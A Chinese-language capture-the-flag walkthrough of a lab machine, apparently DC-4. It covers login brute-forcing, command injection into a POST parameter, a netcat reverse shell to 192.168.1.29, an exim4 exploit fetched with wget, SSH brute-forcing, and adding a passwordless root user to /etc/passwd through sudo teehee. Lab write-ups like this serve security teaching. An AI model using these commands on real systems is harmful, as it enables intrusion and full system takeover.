该靶场在官网的描述如下

只有一个Flag，但是从技术上讲，有多个入口点，就像上次一样，没有任何线索

使用nmap扫描

nmap -Pn 192.168.1.36

靶场只开放22和80端口，使用浏览器访问，是一个登陆页面，结合官网描述可能可以从登陆页面入手，该页面可能存在SQL注入，XSS，爆破账号密码，22号端口的SSH服务也可以爆破

逐个尝试SQL注入和XSS，没有存在这些漏洞，于是只能进行账号密码的爆破，使用bp抓包，发送到爆破模块

设置爆破类型为Sniper

选择字典，该字典可以从fuzzdb的Github项目中获取

https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt

一会儿之后就可以看到密码为happy

使用获取的账号密码登录网页后台，发现只有一个Command的按钮

点击之后出现三个选项

点击其中一个看看回显什么，是一个POST请求，页面上回显出命令ls的执行结果

可能存在命令注入，使用bp抓包，将包发哦是那个到重放模块，修改radio参数的值

尝试直接在后面拼接命令whoami

点击发送该报文，页面上出现当前用户名www-data，说明确实存在命令注入，接着使用命令注入利用nc反弹会话

使用python升级shell，查看设置SUID的文件

python -c 'import pty;pty.spawn("/bin/bash")'find / -perm -u=s -type f 2>/dev/null

注意到一个exim4，之前我们提权的时候用过，更具体的可以查看之前的教程DC-8，还需要注意一下用户jim下有个设置了SUID位的shell脚本test.sh文件

searchsploit exim

将该文件下载到靶机上

wget http://192.168.1.29/46996.sh

添加执行权限

chmod +x 46996.shnetcat -e /bin/bash 192.168.1.29 4444

在本机开启监听

nc -nvlp 4444

获取会话查看Flag

cat flag.txt

这是一种通过exim提权的方法

尝试使用msf模块进行ssh登陆爆破

search ssh_login

将该模块的参数设置如下

show options

新线索，查看该文件时发现了另一个用户charles的密码

切换到charles用户，查看权限

sudo -l

发现该用户可以使用无密码以root权限运行teehee，查看该命令的用法

Usage: teehee [OPTION]... [FILE]...                                                                                                                                   Copy standard input to each FILE, and also to standard output.

teehee的-a参数可以在文件末尾追加内容，于是就想可以在/etc/passwd文件末尾添加一个用户，并指定其有root权限

sudo teehee -a /etc/passwd                                             kali::0:0:root:/root:/bin/bash                                                                 kali::0:0:root:/root:/bin/bash^C

添加完成之后，切换到kali用户，查看Flag
